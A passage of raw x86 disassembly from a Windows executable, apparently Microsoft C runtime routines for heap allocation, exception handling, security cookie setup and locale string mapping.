  42701e:	push   0x20
  427020:	pop    edi
  427021:	jmp    0x427081
  427023:	cmp    DWORD PTR [ebx+0x8],0x0
  427027:	jne    0x427034
  427029:	add    ebx,0x14
  42702c:	mov    DWORD PTR [ebp+0x8],ebx
  42702f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427032:	jb     0x427023
  427034:	cmp    ebx,DWORD PTR [ebp-0x4]
  427037:	jne    0x42705f
  427039:	mov    ebx,edx
  42703b:	jmp    0x427046
  42703d:	cmp    DWORD PTR [ebx+0x8],0x0
  427041:	jne    0x42704d
  427043:	add    ebx,0x14
  427046:	cmp    ebx,eax
  427048:	mov    DWORD PTR [ebp+0x8],ebx
  42704b:	jb     0x42703d
  42704d:	cmp    ebx,eax
  42704f:	jne    0x42705f
  427051:	call   0x426a65
  427056:	mov    ebx,eax
  427058:	test   ebx,ebx
  42705a:	mov    DWORD PTR [ebp+0x8],ebx
  42705d:	je     0x427077
  42705f:	push   ebx
  427060:	call   0x426b1c
  427065:	pop    ecx
  427066:	mov    ecx,DWORD PTR [ebx+0x10]
  427069:	mov    DWORD PTR [ecx],eax
  42706b:	mov    eax,DWORD PTR [ebx+0x10]
  42706e:	cmp    DWORD PTR [eax],0xffffffff
  427071:	jne    0x426f9b
  427077:	xor    eax,eax
  427079:	jmp    0x4271f8
  42707e:	shl    ecx,1
  427080:	inc    edi
  427081:	test   ecx,ecx
  427083:	jge    0x42707e
  427085:	mov    ecx,DWORD PTR [ebp-0xc]
  427088:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42708c:	mov    ecx,DWORD PTR [edx]
  42708e:	sub    ecx,DWORD PTR [ebp-0x10]
  427091:	mov    esi,ecx
  427093:	sar    esi,0x4
  427096:	dec    esi
  427097:	cmp    esi,0x3f
  42709a:	mov    DWORD PTR [ebp-0x8],ecx
  42709d:	jle    0x4270a2
  42709f:	push   0x3f
  4270a1:	pop    esi
  4270a2:	cmp    esi,edi
  4270a4:	je     0x4271ab
  4270aa:	mov    ecx,DWORD PTR [edx+0x4]
  4270ad:	cmp    ecx,DWORD PTR [edx+0x8]
  4270b0:	jne    0x42710e
  4270b2:	cmp    edi,0x20
  4270b5:	mov    ebx,0x80000000
  4270ba:	jge    0x4270e2
  4270bc:	mov    ecx,edi
  4270be:	shr    ebx,cl
  4270c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270c3:	lea    edi,[eax+edi*1+0x4]
  4270c7:	not    ebx
  4270c9:	mov    DWORD PTR [ebp-0x14],ebx
  4270cc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270d0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270d4:	dec    BYTE PTR [edi]
  4270d6:	jne    0x42710b
  4270d8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270db:	mov    ebx,DWORD PTR [ebp+0x8]
  4270de:	and    DWORD PTR [ebx],ecx
  4270e0:	jmp    0x42710e
  4270e2:	lea    ecx,[edi-0x20]
  4270e5:	shr    ebx,cl
  4270e7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270ea:	lea    ecx,[eax+ecx*4+0xc4]
  4270f1:	lea    edi,[eax+edi*1+0x4]
  4270f5:	not    ebx
  4270f7:	and    DWORD PTR [ecx],ebx
  4270f9:	dec    BYTE PTR [edi]
  4270fb:	mov    DWORD PTR [ebp-0x14],ebx
  4270fe:	jne    0x42710b
  427100:	mov    ebx,DWORD PTR [ebp+0x8]
  427103:	mov    ecx,DWORD PTR [ebp-0x14]
  427106:	and    DWORD PTR [ebx+0x4],ecx
  427109:	jmp    0x42710e
  42710b:	mov    ebx,DWORD PTR [ebp+0x8]
  42710e:	cmp    DWORD PTR [ebp-0x8],0x0
  427112:	mov    ecx,DWORD PTR [edx+0x8]
  427115:	mov    edi,DWORD PTR [edx+0x4]
  427118:	mov    DWORD PTR [ecx+0x4],edi
  42711b:	mov    ecx,DWORD PTR [edx+0x4]
  42711e:	mov    edi,DWORD PTR [edx+0x8]
  427121:	mov    DWORD PTR [ecx+0x8],edi
  427124:	je     0x4271b7
  42712a:	mov    ecx,DWORD PTR [ebp-0xc]
  42712d:	lea    ecx,[ecx+esi*8]
  427130:	mov    edi,DWORD PTR [ecx+0x4]
  427133:	mov    DWORD PTR [edx+0x8],ecx
  427136:	mov    DWORD PTR [edx+0x4],edi
  427139:	mov    DWORD PTR [ecx+0x4],edx
  42713c:	mov    ecx,DWORD PTR [edx+0x4]
  42713f:	mov    DWORD PTR [ecx+0x8],edx
  427142:	mov    ecx,DWORD PTR [edx+0x4]
  427145:	cmp    ecx,DWORD PTR [edx+0x8]
  427148:	jne    0x4271a8
  42714a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42714e:	mov    BYTE PTR [ebp+0xb],cl
  427151:	inc    cl
  427153:	cmp    esi,0x20
  427156:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42715a:	jge    0x42717f
  42715c:	cmp    BYTE PTR [ebp+0xb],0x0
  427160:	jne    0x42716d
  427162:	mov    edi,0x80000000
  427167:	mov    ecx,esi
  427169:	shr    edi,cl
  42716b:	or     DWORD PTR [ebx],edi
  42716d:	mov    ecx,esi
  42716f:	mov    edi,0x80000000
  427174:	shr    edi,cl
  427176:	mov    ecx,DWORD PTR [ebp-0x4]
  427179:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42717d:	jmp    0x4271a8
  42717f:	cmp    BYTE PTR [ebp+0xb],0x0
  427183:	jne    0x427192
  427185:	lea    ecx,[esi-0x20]
  427188:	mov    edi,0x80000000
  42718d:	shr    edi,cl
  42718f:	or     DWORD PTR [ebx+0x4],edi
  427192:	mov    ecx,DWORD PTR [ebp-0x4]
  427195:	lea    edi,[eax+ecx*4+0xc4]
  42719c:	lea    ecx,[esi-0x20]
  42719f:	mov    esi,0x80000000
  4271a4:	shr    esi,cl
  4271a6:	or     DWORD PTR [edi],esi
  4271a8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ab:	test   ecx,ecx
  4271ad:	je     0x4271ba
  4271af:	mov    DWORD PTR [edx],ecx
  4271b1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271b5:	jmp    0x4271ba
  4271b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ba:	mov    esi,DWORD PTR [ebp-0x10]
  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
